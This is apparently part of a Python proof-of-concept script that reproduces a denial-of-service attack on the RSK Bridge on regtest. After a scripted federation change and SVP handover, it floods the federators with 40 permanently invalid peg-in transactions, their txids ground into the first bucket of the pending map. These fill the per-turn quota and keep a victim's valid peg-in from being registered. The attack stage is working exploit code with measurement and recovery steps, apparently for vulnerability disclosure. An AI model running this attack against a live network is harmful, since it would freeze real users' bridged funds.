    start_block = int(rsk("eth_blockNumber"), 16)
    deadline = start_block + timeout_blocks
    prop = proposed_address()
    if not prop:
        return False, "the Bridge reports no proposed federation address"
    prop_spk = address_script(prop).hex()
    log("             proposed federation pays to %s" % prop)
    CALLER[0] = federation_caller()

    # one node's log only: node B re-executes every block while syncing
    offsets = {f: o for f, o in log_offsets().items()
               if f.endswith(os.path.join("node-federator1", "rsk.log"))}
    if not offsets:
        offsets = log_offsets()

    height_now = btc("getblockcount")
    if height_now < PEGOUT_INDEX_BTC_HEIGHT + 5:
        need = PEGOUT_INDEX_BTC_HEIGHT + 5 - height_now
        log("             Bitcoin is at %d; the RSKIP419-aware classifier only runs from "
            "block %d (BridgeRegTestConstants: 250 + 100), so mining %d blocks first"
            % (height_now, PEGOUT_INDEX_BTC_HEIGHT, need))
        mine(need)
        height_now = btc("getblockcount")
    log("             Bitcoin height %d, SVP-aware classification from %d"
        % (height_now, PEGOUT_INDEX_BTC_HEIGHT))

    scan = btc("getblockcount")
    fund = None          # (txid, sats to the proposed federation, btc height)
    spend = None
    calls = 0
    last_call = 0
    spend_requested = False
    last_print = 0.0

    def call(reason):
        """One updateCollections, and how many fund txs the Bridge built for it.

        Attributable because this is the only caller. Two builds for one call
        would mean the same RSK transaction was executed in more than one block;
        one build per call means the stored hash did not survive to the next one.
        """
        nonlocal calls, last_call, built
        blk_now = int(rsk("eth_blockNumber"), 16)
        before = len(log_since(r"No svp values were found", offsets))
        receipt = send_update_collections()
        calls, last_call = calls + 1, blk_now
        time.sleep(1)
        n = len(log_since(r"No svp values were found", offsets)) - before
        released = release_requested_hashes(receipt)
        if n and released:
            built.extend(released)
        log("             call #%d at block %d (%s): the Bridge built %d fund tx%s"
            % (calls, blk_now, reason, n,
               (", asked to release %s" % ", ".join(h[:16] for h in released))
               if released else ""))

    # first call: this is what creates the fund tx
    calls, last_call = 0, start_block
    built = []          # BTC tx hashes the Bridge asked to release, in order
    call("start of the SVP")

    while True:
        blk = int(rsk("eth_blockNumber"), 16)
        size = proposed_size()
        committed = log_since(r"Committed to proposed federation", offsets)

        if committed and size <= 0:
            log("             handover at block %d" % blk)
            if not fund:
                return False, "the proposal was committed but no fund tx was ever seen"
            log("               fund  tx %s (%d sat to the proposed federation, %d conf)"
                % (fund[0], fund[1], btc_confirmations(fund[0])))
            if not spend:
                return False, ("proposed federation committed but no tx spending the fund "
                               "tx was mined")
            log("               spend tx %s (spends the fund tx)" % spend)
            for line in committed[-2:]:
                log("               " + line.strip()[:170])
            return True, ""

        if size <= 0:
            return False, ("the proposed federation was cleared at block %d without a "
                           "handover: the SVP expired or failed" % blk)
        if blk > deadline:
            if fund:
                return False, ("no handover at block %d: the fund tx %s is on Bitcoin "
                               "with %d confirmations and %s"
                               % (blk, fund[0], btc_confirmations(fund[0]),
                                  "the spend tx %s was mined but never committed" % spend
                                  if spend else "no tx spending it was ever mined"))
            return False, ("no handover at block %d and no fund tx ever reached Bitcoin: "
                           "%d updateCollections calls (%d, 12, 24, ... blocks) built "
                           "nothing" % (blk, calls))

        # -- what Bitcoin says ----------------------------------------------
        height = btc("getblockcount")
        while scan <= height:
            for tx in btc_block_txs(scan):
                if fund is None:
                    paid = _tx_pays(tx, prop_spk)
                    if paid:
                        fund = (tx["txid"], paid, scan)
                        log("             block %d: fund tx %s on Bitcoin, %d sat to the "
                            "proposed federation" % (scan, tx["txid"], paid))
                        if scan < PEGOUT_INDEX_BTC_HEIGHT:
                            log("             WARNING: block %d is below %d, so this tx "
                                "cannot be typed SVP_FUND_TX" % (scan, PEGOUT_INDEX_BTC_HEIGHT))
                        if built:
                            if len(built) > 1:
                                log("             the Bridge asked to release %d txs: %s"
                                    % (len(built), ", ".join(h[:16] for h in built)))
                            same = built[-1] == tx["txid"].lower()
                            log("             the Bridge built %s, %s" %
                                (built[-1][:16],
                                 "the same tx: the stored hash was simply gone by the "
                                 "time this tx was registered"
                                 if same else
                                 "a DIFFERENT tx: the stored hash can never match the "
                                 "tx the federation signed"))
                elif spend is None and any(
                        (i.get("txid") or "") == fund[0] for i in tx.get("vin", [])):
                    spend = tx["txid"]
                    log("             block %d: spend tx %s spends the fund tx"
                        % (scan, spend))
            scan += 1

        # -- what the Bridge made of the fund tx ----------------------------
        if fund and not spend:
            types = [l for l in log_since(r"This is a (\w+) transaction type", offsets)
                     if fund[0] in l]
            if types and "SVP_FUND_TX" not in types[-1]:
                seen = types[-1].split("This is a ")[-1].split(" transaction")[0]
                if fund[2] and fund[2] < PEGOUT_INDEX_BTC_HEIGHT:
                    return False, ("the fund tx %s is in Bitcoin block %d and the "
                                   "RSKIP419-aware classifier only runs from block %d "
                                   "(BridgeRegTestConstants: 250 + 100), so the legacy "
                                   "classifier typed it %s. Nothing is wrong with the "
                                   "SVP -- the fixture mined the fund tx too early."
                                   % (fund[0], fund[2], PEGOUT_INDEX_BTC_HEIGHT, seen))
                why = diagnose_fund_tx(fund[0], seen, offsets)
                return False, ("the Bridge classified its own fund tx %s as %s at block "
                               "%d instead of SVP_FUND_TX, so it never stored the signed "
                               "tx and no spend tx was ever built.\n  %s"
                               % (fund[0], seen, blk, why))
            if log_since(r"Fund tx signed was found|is the svp fund transaction", offsets) \
                    and not spend_requested:
                spend_requested = True
                log("             the Bridge recognised the signed fund tx; asking it to "
                    "build the spend tx")
                call("fund tx recognised")

        # -- retries: the Bridge also needs turns to advance its own queues --
        if blk - last_call >= 12 and calls < 10:
            call("periodic")

        mine(1)
        time.sleep(1.2)

        now = time.time()
        if now - last_print > 20:
            last_print = now
            log("             block %d: %d of %d SVP blocks left, proposed size %d, "
                "%s, spend tx %s, %d Bridge calls"
                % (blk, deadline - blk, timeout_blocks, size,
                   ("fund tx %s (%d conf)" % (fund[0], btc_confirmations(fund[0])))
                   if fund else "no fund tx yet",
                   "created" if spend else
                   ("waiting for signatures" if svp_spend_tx_pending() else "not created"),
                   calls))


# ---------------------------------------------------------------------------
# stage: federation
# ---------------------------------------------------------------------------

def stage_peg():
    """Put real BTC into the ACTIVE federation before changing it.

    RSKIP419's fund tx pays 2 x 500 000 sat to the proposed federation, and
    buildSvpFundTransaction uses the active federation's UTXOs. With an empty
    federation there is nothing to spend, the Bridge only logs "Couldn't create
    svp fund transaction" and the SVP silently expires after 125 blocks. So the
    genesis federation has to hold funds first -- exactly like a real chain.
    """
    st = load_state()
    addr = active_address()
    spk = address_script(addr)
    log("[peg] active federation %s" % addr)

    if "peg_txid" in st:
        log("[peg] already funded in a previous run, tx %s" % st["peg_txid"])
        return

    if not btc_best_chain_height():
        log("[peg] waiting for the Bridge to see the Bitcoin chain")
        end = time.time() + 300
        while time.time() < end and not btc_best_chain_height():
            time.sleep(4)

    faddr = p2pkh_address(FUNDER.public_key.format(True))
    fscript = p2pkh_script(FUNDER.public_key.format(True))
    txid, vout, sat = fund_address(faddr, 0.05, fscript.hex())
    log("[peg] funded the funder %s with %.8f BTC (%s:%d)" % (faddr, sat / 1e8, txid[:18], vout))

    fee = 1_000
    change = sat - PEG_SAT - fee
    raw, peg_txid = sign_tx(FUNDER, bytes.fromhex(txid)[::-1], vout, fscript,
                            [(PEG_SAT, spk), (change, fscript)])
    btc("sendrawtransaction", [raw.hex()])
    log("[peg] peg-in %s (%d sat) -> the genesis federation" % (peg_txid[::-1].hex(), PEG_SAT))

    time.sleep(3)
    mine(BTC_CONFIRMATIONS + 2)

    target = btc("getblockcount")
    end = time.time() + 420
    while time.time() < end:
        if btc_best_chain_height() >= target:
            break
        time.sleep(4)
    log("[peg] Bridge BTC height %d (bitcoind %d)" % (btc_best_chain_height(), target))

    end = time.time() + 420
    while time.time() < end:
        h = processed_height(peg_txid[::-1].hex())
        if h >= 0:
            log("[peg] the Bridge registered the peg-in at RSK block %d; the "
                "federation now holds real BTC" % h)
            st["peg_txid"] = peg_txid[::-1].hex()
            save_state(st)
            return
        time.sleep(3)
    bridge_log_tail(30, r"registerBtcTransaction|SVP|svp|peg")
    raise RuntimeError("the pre-peg-in was never registered by the Bridge")


def stage_federation():
    st = load_state()

    # createPendingFederation has four guards: a pending federation exists (-1),
    # a proposed one exists (-4, only possible with RSKIP419), a federation is
    # still awaiting activation (-2, needs both a "new" and an "old" federation in
    # storage) and a retiring federation exists (-3). On a fresh chain neither the
    # new nor the old federation slot is populated (FederationStorageProviderImpl
    # reads them straight from storage, there is no genesis fallback), so none of
    # the four applies and the vote can run on the very first blocks. Only wait
    # for the chain to be alive.
    log("[federation] waiting for the chain to produce a few blocks")
    end = time.time() + 300
    while time.time() < end:
        blk = int(rsk("eth_blockNumber"), 16)
        if blk >= 3:
            break
        time.sleep(2)
    else:
        raise RuntimeError("the chain did not produce blocks")
    log("             block %d" % int(rsk("eth_blockNumber"), 16))

    # a proposed federation left over from an interrupted run blocks
    # createFederation with -4; either finish it or let it expire first
    if proposed_size() > 0:
        log("[federation] a proposed federation from an earlier attempt is still "
            "stored; finishing or expiring it first")
        ok, why = svp_cycle()
        log("             %s" % ("handover done" if ok else "it expired: " + why))

    log("[federation] current federation")
    size = dec_uint("0x" + bridge_call(sel("getFederationSize()")).hex())
    addr_before = dec_bytes("0x" + bridge_call(sel("getFederationAddress()")).hex()).decode()
    log("             size=%d address=%s" % (size, addr_before))

    a = rsk_address(AUTH_A)
    b = rsk_address(AUTH_B)
    c = rsk_address(AUTH_C)
    log("[federation] authorizers: %s %s %s" % (a[:10], b[:10], c[:10]))
    wallet_accounts = [x.lower() for x in (rsk("eth_accounts") or [])]
    for who, k in (("auth-a", a), ("auth-b", b), ("auth-c", c)):
        present = "in wallet" if k.lower() in wallet_accounts else "NOT IN WALLET"
        log("             %s %s" % (who, present))

    def send_vote(data, who, k):
        """One real vote. Returns True when the transaction was mined."""
        code = vote_dry_run(data, k)
        if code != 1:
            bridge_log_tail()
            raise RuntimeError("vote dry run rejected for %s: code %d (%s)"
                               % (who, code, FED_CODE.get(code, "unknown")))
        txh = bridge_tx(data, k)
        rc = wait_rsk_tx(txh, timeout=120)
        sender = (rc.get("from") or "").lower()
        if sender and sender != k.lower():
            raise RuntimeError("tx signed by %s but %s was requested" % (sender, who))
        if rc.get("status") not in ("0x1", 1, True):
            raise RuntimeError("vote from %s reverted: %s" % (who, rc))
        log("             %s voted (%s)" % (who, txh[:18]))
        return True

    def vote_round(data, effect, label):
        """Vote until `effect` is observed. A round needs 2 of the 3 authorizers,
        and the Bridge only executes a winner once the majority is reached, so
        the outcome -- not the return code -- decides whether we are done."""
        if effect():
            return True
        for who, k in (("auth-a", a), ("auth-b", b), ("auth-c", c)):
            send_vote(data, who, k)
            for _ in range(15):
                if effect():
                    return True
                time.sleep(1)
        bridge_log_tail()
        return False

    # Every round is decided by the observed outcome, never by a return code:
    # createFederation/addFederatorPublicKeyMultikey report the dry-run result,
    # and the winning (non-dry) execution is a different code path.
    log("[federation] createFederation")
    if not vote_round(sel("createFederation()"), lambda: pending_hash() != b"", "create"):
        raise RuntimeError("createFederation produced no pending federation")
    log("             pending federation exists, size %d" % pending_size())

    log("[federation] addFederatorPublicKeyMultikey x%d" % len(FEDS))
    for i, k in enumerate(FEDS, start=1):
        btc_pub = k.public_key.format(True)      # 33 bytes, compressed
        ec_pub = k.public_key.format(False)      # 65 bytes, uncompressed
        data = sel("addFederatorPublicKeyMultikey(bytes,bytes,bytes)") + enc_bytes3(btc_pub, ec_pub, ec_pub)
        want = i
        ok = vote_round(data, lambda w=want: pending_size() >= w, "add %d" % i)
        if not ok:
            raise RuntimeError("federator %d was not added" % i)
        log("             %s added, pending federation size %d" % (rsk_address(k)[:10], pending_size()))

    pend = pending_hash()
    if not pend:
        bridge_log_tail()
        raise RuntimeError("the pending federation disappeared before commit")
    log("[federation] pending federation hash 0x%s" % pend.hex())

    log("[federation] commitFederation")
    # A successful commit clears the pending federation; the *active* one only
    # changes 150 blocks later (federationActivationAge), which is the wait below.
    if not vote_round(sel("commitFederation(bytes)") + enc_bytes(pend),
                      lambda: pending_hash() == b"", "commit"):
        raise RuntimeError("commitFederation did not clear the pending federation")
    log("             committed; the new federation activates in 150 blocks")

    # ------------------------------------------------------------------
    # RSKIP419: the commit stored a *proposed* federation. The handover needs an
    # SVP cycle:
    #   updateCollections -> fund tx (active fed pays the proposed fed)
    #   both federators sign -> broadcast -> mine -> registered
    #   updateCollections -> spend tx (proposed fed pays back)
    #   both federators sign -> broadcast -> mine -> registered
    #   registerSvpSpendTx -> commitProposedFederation -> handover
    # The whole cycle has to finish inside validationPeriodDurationInBlocks
    # (125 blocks in regtest) or the Bridge throws the proposal away.
    # ------------------------------------------------------------------
    if not proposed_size():
        bridge_log_tail()
        raise RuntimeError(
            "commitFederation produced neither a proposed federation nor a handover")

    log("[federation] proposed federation set (size %d); driving the SVP cycle"
        % proposed_size())
    ok, why = svp_cycle()
    if not ok:
        bridge_log_tail(40, r"SVP|svp|processSvp|commitProposed|Fund tx|Spend tx|registerBtc")
        raise RuntimeError("the SVP cycle did not hand the federation over: " + why)
    log("[federation] Handover done: the new federation is stored and will become "
        "active in 150 blocks")

    # wait for the handover to take effect: the new federation must reach
    # federationActivationAge (150 blocks) before it replaces the old one
    log("[federation] waiting for the new federation to activate (150 blocks)")
    end = time.time() + 600
    retiring = ""
    last_print = 0
    while time.time() < end:
        raw = retiring_address()
        if raw:
            retiring = raw
            break
        now = time.time()
        if now - last_print > 20:
            last_print = now
            try:
                blk = int(rsk("eth_blockNumber"), 16)
                log("             block %d, active=%s, retiring=<not yet>"
                    % (blk, active_address()))
            except Exception:
                pass
        time.sleep(2)
    if not retiring:
        raise RuntimeError("the retiring federation never appeared after the handover")

    new_addr = active_address()
    new_size = dec_uint("0x" + bridge_call(sel("getFederationSize()")).hex())
    log("[federation] ACTIVE   %s (size %d)" % (new_addr, new_size))
    log("[federation] RETIRING %s   <-- the old federation, still live" % retiring)

    if not new_addr or new_addr == addr_before:
        raise RuntimeError("active federation address did not change")

    st.update({
        "active_address": new_addr,
        "retiring_address": retiring,
        "old_address": addr_before,
        "fed_size": new_size,
    })
    save_state(st)

    log("[federation] the window is open: the retiring federation stays live for")
    log("             150 blocks after activation, plus 150 more of migration")


# ---------------------------------------------------------------------------
# stage: attack
# ---------------------------------------------------------------------------

def btc_confirmations(txid):
    try:
        return btc("getrawtransaction", [txid, True])["confirmations"]
    except Exception:
        return 0


def mine(n):
    addr = btc("getnewaddress", ["", "legacy"])
    btc("generatetoaddress", [n, addr])
    return addr


def fund_address(addr, amount_btc, spk_hex):
    """Send `amount_btc` to `addr`, mine it, and return the exact outpoint.

    listunspent cannot be used for these addresses: bitcoind only reports UTXOs
    whose key it holds, and the PoC signs with its own keys, so the output is
    invisible to the wallet even though the tx is a wallet tx. -txindex gives us
    the vout directly.
    """
    txid = btc("sendtoaddress", [addr, amount_btc])
    mine(1)
    raw = btc("getrawtransaction", [txid, True])
    want = int(round(amount_btc * 1e8))
    for out in raw.get("vout", []):
        spk = ((out.get("scriptPubKey") or {}).get("hex") or "").lower()
        if spk == spk_hex.lower() and int(round(out["value"] * 1e8)) == want:
            return txid, out["n"], want
    raise RuntimeError(
        "tx %s has no %d sat output paying %s (vouts: %s)"
        % (txid, want, addr, [(o["n"], o["value"]) for o in raw.get("vout", [])]))


def btc_best_chain_height() -> int:
    raw = bridge_call(sel("getBtcBlockchainBestChainHeight()"))
    return int.from_bytes(raw[:32], "big")


def stage_attack():
    st = load_state()

    # RSK block production is deliberately NOT paused here. registerBtcTransaction
    # only takes effect in a mined RSK block, and the Bridge only accepts a peg-in
    # once it knows that Bitcoin block's header (fed by the federator, 25 headers
    # per turn), so the chain has to keep producing blocks while the flood is set
    # up. The whole stage is kept well inside the retiring-federation window: the
    # window is 150 blocks (FederationRegTestConstants), one block per second, and
    # this stage spends ~10 s grinding + ~20 blocks catching up the Bridge.
    log("[attack] the retiring federation window is open; the clock is running")
    active = st["active_address"]
    retiring = st["retiring_address"]
    log("[attack] active   %s" % active)
    log("[attack] retiring %s" % retiring)

    spk_active = address_script(active)
    spk_retiring = address_script(retiring)
    log("[attack] active scriptPubKey   %s%s" % (spk_active.hex()[:24], "..."))
    log("[attack] retiring scriptPubKey %s%s" % (spk_retiring.hex()[:24], "..."))

    # ---- fund the attacker wallet -------------------------------------
    attacker_addr = p2pkh_address(ATTACKER.public_key.format(True))
    prev_script = p2pkh_script(ATTACKER.public_key.format(True))
    if "attack_funding" not in st:
        txid, vout, sat = fund_address(attacker_addr, 0.8, prev_script.hex())
        st["attack_funding"] = {"txid": txid, "vout": vout, "sat": sat}
        save_state(st)
        log("[attack] funded attacker %s with %.8f BTC (%s:%d)"
            % (attacker_addr, sat / 1e8, txid[:18], vout))
    fu = st["attack_funding"]
    prev_txid = bytes.fromhex(fu["txid"])[::-1]

    # ---- fan out one UTXO into 40 branches (+ spares) -------------------
    # The spares are not paranoia: a branch that never reaches the federator's
    # mempool before its block is skipped forever (see the check below), and one
    # missing attack tx is enough to hand the victim the last quota slot.
    slots = ATTACK_COUNT + SPARE_TXS
    if "funding_txid" not in st:
        outs = [(FANOUT_VALUE, prev_script)] * slots
        total = FANOUT_VALUE * slots
        fee = 2_000 + slots * 34
        change = fu["sat"] - total - fee
        if change <= 0:
            raise RuntimeError("the attacker funding cannot cover %d branches" % slots)
        outs.append((change, prev_script))
        raw, txid = sign_tx(ATTACKER, prev_txid, fu["vout"], prev_script, outs)
        btc("sendrawtransaction", [raw.hex()])
        mine(1)
        log("[attack] fan-out tx %s -> %d x %d sat"
            % (txid[::-1].hex(), slots, FANOUT_VALUE))
        st["funding_txid"] = txid[::-1].hex()
        st["fanout_slots"] = slots
        save_state(st)
    elif st.get("fanout_slots") != slots:
        raise RuntimeError(
            "state.json was written by a run with %s fan-out branches, this build "
            "wants %d. Start from scratch (./e2e/run.sh without --from)."
            % (st.get("fanout_slots"), slots))
    funding_txid = bytes.fromhex(st["funding_txid"])[::-1]

    # ---- build + grind + broadcast the 40 attack transactions ----------
    # Each one spends its own fan-out output (vout 0..slots-1) and pays
    #   MIN_PEGIN_SAT to the active federation,
    #   RETIRING_SAT   to the retiring federation,
    #   a dust output and change back to the attacker.
    # The second output is what the Bridge rejects: with RSKIP379 every output to
    # a live federation must be at least the minimum peg-in value, so the tx is
    # INVALID_AMOUNT forever. It is also why the tx has to pay the retiring
    # federation: that is what makes it a *live federation* output.
    mask = (1 << BIN_BITS) - 1
    attack = []

    def broadcast_one(slot):
        attempts = 0
        while True:
            attempts += 1
            dust = 546 + ((slot * 7919 + attempts * 40503) % 60_000)
            change = FANOUT_VALUE - MIN_PEGIN_SAT - RETIRING_SAT - dust - 1_200
            outs = [
                (MIN_PEGIN_SAT, spk_active),
                (RETIRING_SAT, spk_retiring),
                (dust, prev_script),
                (change, prev_script),
            ]
            raw, txid = sign_tx(ATTACKER, funding_txid, slot, prev_script, outs)
            if bin_index(txid, mask) == 0:
                break
        btc("sendrawtransaction", [raw.hex()])
        rec = {"txid": txid[::-1].hex(), "slot": slot, "attempts": attempts}
        attack.append(rec)
        return rec

    offsets = log_offsets()
    for i in range(ATTACK_COUNT):
        rec = broadcast_one(i)
        if (i + 1) % 10 == 0:
            log("         %2d/%d broadcast (avg %d attempts)"
                % (i + 1, ATTACK_COUNT, rec["attempts"]))
    log("[attack] %d attack txs broadcast, all ground into bin 0" % len(attack))

    # ---- the queue has to be full BEFORE the block, not after -----------
    # BtcToRskClient.onBlock only stores a merkle proof for a tx it already
    # tracks (:259); onTransaction is what puts it there (:389). A tx the
    # federator first hears about inside a block gets no proof and is silently
    # skipped forever. With 39 sendable attack txs the per-turn quota of 40 has
    # one slot left, and the victim takes it -- exactly what happened in the run
    # before this check existed. So: wait for the mempool, top up with a spare if
    # the queue is short, and refuse to go on if it still is.
    def queue_size():
        """Per node: how many attack txids that node's federator has in its mempool.

        Both nodes are federation members and each sends its own quota, so a
        queue that is full on node A and one short on node B is still a hole.
        """
        import re as _re
        out = {}
        for path, off in offsets.items():
            if "node-federator" not in path:
                continue
            seen = set()
            for line in log_since(r"\[onTransaction\] [0-9a-f]{64}", {path: off}):
                m = _re.search(r"\[onTransaction\] ([0-9a-f]{64})", line)
                if m:
                    seen.add(m.group(1))
            name = path.split("node-")[-1].split(os.sep)[0]
            out[name] = sum(1 for a in attack if a["txid"] in seen)
        return out

    def seen_in_mempool(txid, timeout):
        """Per node: has this txid been logged as received from the mempool?"""
        import re as _re
        end = time.time() + timeout
        while True:
            out = {}
            for path, off in offsets.items():
                if "node-federator" not in path:
                    continue
                hit = any(txid in line for line in
                          log_since(r"\[onTransaction\] " + txid, {path: off}))
                out[path.split("node-")[-1].split(os.sep)[0]] = hit
            if out and all(out.values()):
                return out
            if time.time() >= end:
                return out
            time.sleep(3)

    def wait_for_queue(want, timeout):
        end = time.time() + timeout
        q = queue_size()
        while (not q or min(q.values()) < want) and time.time() < end:
            time.sleep(3)
            q = queue_size()
        return q

    def show(q):
        return ", ".join("%s %d" % (k, v) for k, v in sorted(q.items())) or "no node logs"

    queued = wait_for_queue(ATTACK_COUNT, 90)
    log("[attack] in each federator's mempool before any block: %s (of %d sent)"
        % (show(queued), len(attack)))
    slot = ATTACK_COUNT
    while (not queued or min(queued.values()) < ATTACK_COUNT) \
            and slot < ATTACK_COUNT + SPARE_TXS:
        rec = broadcast_one(slot)
        slot += 1
        queued = wait_for_queue(ATTACK_COUNT, 60)
        log("[attack] spare %s broadcast (slot %d); now %s"
            % (rec["txid"][:12], rec["slot"], show(queued)))
    if not queued or min(queued.values()) < ATTACK_COUNT:
        raise RuntimeError(
            "the attack queue never filled: %s. Each federator sends at most %d "
            "sendable txs per turn, so a shorter queue leaves a slot for the victim "
            "and the flood would prove nothing. Spares (%d) did not make up the "
            "difference." % (show(queued), ATTACK_COUNT, SPARE_TXS))

    # ---- the victim: one ordinary, perfectly valid peg-in --------------
    if "victim_txid" not in st:
        vaddr = p2pkh_address(VICTIM.public_key.format(True))
        v_script = p2pkh_script(VICTIM.public_key.format(True))
        if "victim_funding" not in st:
            vtxid, vvout, vsat = fund_address(vaddr, 0.05, v_script.hex())
            st["victim_funding"] = {"txid": vtxid, "vout": vvout, "sat": vsat}
            save_state(st)
        vf = st["victim_funding"]
        v_prev = bytes.fromhex(vf["txid"])[::-1]
        v_fee = 1_000
        v_change = vf["sat"] - VICTIM_PEGIN_SAT - v_fee
        if v_change <= 0:
            raise RuntimeError("victim funding too small: change would be %d sat" % v_change)
        v_outs = [(VICTIM_PEGIN_SAT, spk_active), (v_change, v_script)]
        v_raw, v_txid = sign_tx(VICTIM, v_prev, vf["vout"], v_script, v_outs)
        btc("sendrawtransaction", [v_raw.hex()])
        log("[attack] victim peg-in %s (%d sat) -> %s"
            % (v_txid[::-1].hex(), VICTIM_PEGIN_SAT, vaddr))
        # The victim needs its proof too: a tx the federator only meets inside a
        # block is skipped forever, and then it would never be credited even
        # after the window closes -- a false 'frozen' and a broken recovery.
        seen = seen_in_mempool(v_txid[::-1].hex(), 60)
        log("[attack] victim tx reached the mempool of: %s"
            % ", ".join("%s %s" % (k, "yes" if v else "NO") for k, v in sorted(seen.items())))
        if not seen or not all(seen.values()):
            raise RuntimeError(
                "the victim's peg-in never reached every federator's mempool (%s), so "
                "no merkle proof would ever be stored for it and the measurement would "
                "be meaningless." % seen)
        st["victim_txid"] = v_txid[::-1].hex()
        st["victim_btc_address"] = vaddr
        st["victim_rsk_address"] = victim_rsk_address(VICTIM)
        save_state(st)

    st["attack_txids"] = [a["txid"] for a in attack]
    save_state(st)

    # ---- confirm everything on Bitcoin --------------------------------
    # Every tx above (attack and victim) is now known to be in both federators'
    # mempools, which is the condition onBlock needs to store a merkle proof for
    # it. Mining is what confirms them.
    mine(BTC_CONFIRMATIONS + 2)
    log("[attack] %d BTC blocks mined" % (BTC_CONFIRMATIONS + 2))

    # the Bridge only accepts a peg-in once it knows the header of its block, and
    # the federator feeds it 25 headers per turn
    target = btc("getblockcount")
    log("[attack] waiting for the Bridge to catch up to BTC block %d" % target)
    end = time.time() + 600
    while time.time() < end:
        h = btc_best_chain_height()
        if h >= target:
            log("[attack] Bridge BTC height is now %d" % h)
            break
        time.sleep(5)
    else:
        log("[attack] Bridge BTC height stuck at %d (target %d)" % (btc_best_chain_height(), target))

    # ---- prove the flood is actually running before spending 2 more minutes --
    # A rejection is invisible from the RPC: registerBtcTransaction still mines
    # with status 0x1 and the Bridge only logs it at DEBUG. What *is* observable
    # is that the federator keeps sending (its RSK nonce climbs by up to 40 per
    # turn) while none of the 40 hashes and not the victim's hash ever get a
    # processed height. If the victim is processed here the attack did not work
    # and there is no point in measuring.
    # how many txs the federator now has waiting, from its own log: this is the
    # queue the per-turn quota of 40 is taken from, so it has to be > 40
    import re as _re2
    depths = [int(m.group(1)) for m in
              (_re2.search(r"Tx to send count: (\d+)", l) for l in
               log_since(r"Tx to send count: [0-9]+", offsets))
              if m]
    if depths:
        log("[attack] the federator's pending list holds %d txs (quota %d per turn)"
            % (max(depths), ATTACK_COUNT))
        if max(depths) <= ATTACK_COUNT - 1:
            log("[attack] WARNING: the queue is not deeper than the quota, so the "
                "victim has a slot")

    n1 = int(rsk("eth_getTransactionCount", [rsk_address(F1), "latest"]), 16)
    n2 = int(rsk_b("eth_getTransactionCount", [rsk_address(F2), "latest"]), 16)
    turn0 = n1 + n2
    log("[attack] the two federators have sent %d + %d txs so far "
        "(federator1 %s, federator2 %s); watching for the retry loop"
        % (n1, n2, rsk_address(F1)[:10], rsk_address(F2)[:10]))
    # bounded: the window is only 150 blocks long, so this may not eat more
    # than ~30 s of it even in the worst case
    end = time.time() + 30
    working = False
    while time.time() < end:
        time.sleep(5)
        if processed_height(st["victim_txid"]) >= 0:
            stage_measure("early")
            raise RuntimeError(
                "the victim peg-in was processed during the window, so the flood did "
                "not starve registerBtcTransaction.\n"
                "  the per-turn quota is %d sendable txs and all attack txs are ground\n"
                "  into bin 0 of the federator's pending map, which is also hash bucket\n"
                "  0 of that ConcurrentHashMap, so they are always offered first.\n"
                "  A victim that still gets through means fewer than %d of them were\n"
                "  sendable in some turn: check the 'pending list holds N txs' line and\n"
                "  grep the federator log for 'Removed transaction' (shouldSendTx false)."
                % (ATTACK_COUNT, ATTACK_COUNT))
        try:
            n = (int(rsk("eth_getTransactionCount", [rsk_address(F1), "latest"]), 16)
                 + int(rsk_b("eth_getTransactionCount", [rsk_address(F2), "latest"]), 16))
        except Exception:
            n = turn0
        blk = int(rsk("eth_blockNumber"), 16)
        log("[attack] block %d: federator nonce %d (+%d), victim still unprocessed"
            % (blk, n, n - turn0))
        if n > turn0 + 80:
            working = True
            break
    if not working:
        log("[attack] WARNING: the federator nonce did not climb; measuring anyway")
    else:
        log("[attack] flood confirmed on chain: txs are being (re)sent every turn and "
            "nothing gets marked processed")


# ---------------------------------------------------------------------------
# stage: measure
# ---------------------------------------------------------------------------

def processed_height(txid_hex: str) -> int:
    """getBtcTxHashProcessedHeight(string) -> int64, -1 when never processed."""
    data = sel("getBtcTxHashProcessedHeight(string)") + enc_bytes(txid_hex.encode())
    raw = bridge_call(data)
    v = int.from_bytes(raw[:32], "big")
    if v >= (1 << 255):
        v -= (1 << 256)
    return v


def balance(addr: str) -> int:
    return int(rsk("eth_getBalance", [addr, "latest"]), 16)


def stage_measure(label="t"):
    st = load_state()
    vic = st["victim_rsk_address"]
    vic_bal = balance(vic)
    vic_h = processed_height(st["victim_txid"])
    ah = [processed_height(t) for t in st["attack_txids"]]
    unprocessed = sum(1 for h in ah if h < 0)
    attacker_rsk = rsk_address(ATTACKER)

    fed_nonce = -1
    try:
        fed_nonce = (int(rsk("eth_getTransactionCount", [rsk_address(F1), "latest"]), 16)
                     + int(rsk_b("eth_getTransactionCount", [rsk_address(F2), "latest"]), 16))
    except Exception:
        pass

    out = {
        "label": label,
        "rsk_block": int(rsk("eth_blockNumber"), 16),
        "retiring_present": retiring_size() > 0,
        "federator_nonce": fed_nonce,
        "victim_balance_wei": str(vic_bal),
        "victim_processed_height": vic_h,
        "attack_count": len(ah),
        "attacker_processed": len(ah) - unprocessed,
        "attacker_unprocessed": unprocessed,
        "attacker_balance_wei": str(balance(attacker_rsk)),
    }
    log("")
    log("  --- measurement (%s) ---" % label)
    log("  RSK block                  %d   retiring fed live: %s"
        % (out["rsk_block"], out["retiring_present"]))
    log("  federator nonce            %d  (registerBtcTransaction txs sent)"
        % out["federator_nonce"])
    log("  victim  balance            %s wei" % out["victim_balance_wei"])
    log("  victim  processed height   %d  (-1 = never)" % vic_h)
    log("  attack  %d txs processed   %d" % (out["attack_count"], out["attacker_processed"]))
    log("  attack  %d txs unprocessed %d" % (out["attack_count"], out["attacker_unprocessed"]))
    log("  attacker balance           %s wei" % out["attacker_balance_wei"])
    log("")

    st.setdefault("measurements", []).append(out)
    save_state(st)


# ---------------------------------------------------------------------------
# stage: recover
# ---------------------------------------------------------------------------

def active_federation_age():
    """(age in blocks, creation block) of the active federation."""
    raw = bridge_call(sel("getFederationCreationBlockNumber()"))
    created = int.from_bytes(raw[:32], "big")
    blk = int(rsk("eth_blockNumber"), 16)
    return blk - created, created


def stage_recover():
    """Drive the retirement, then wait for the frozen peg-ins to be credited.

    Two consensus numbers decide this stage, both in FederationRegTestConstants:

        federationActivationAge             = 150
        fundsMigrationAgeSinceActivationEnd = 150

    FederationSupportImpl.getMigrationAgeEnd() adds them, so the retiring
    federation's funds may only be migrated once the *active* federation is 300
    blocks old (isActiveFederationPastMigrationAge,
    FederationSupportImpl.java:892). The clearing itself happens in
    processFundsMigration, which runs inside updateCollections
    (BridgeSupport.java:1041 -> :1274). Both nodes run with
    federator.updateCollections = false, so this stage is the caller. Without it
    nothing is migrated, nothing is cleared, and the rejected transactions stay
    rejected forever.

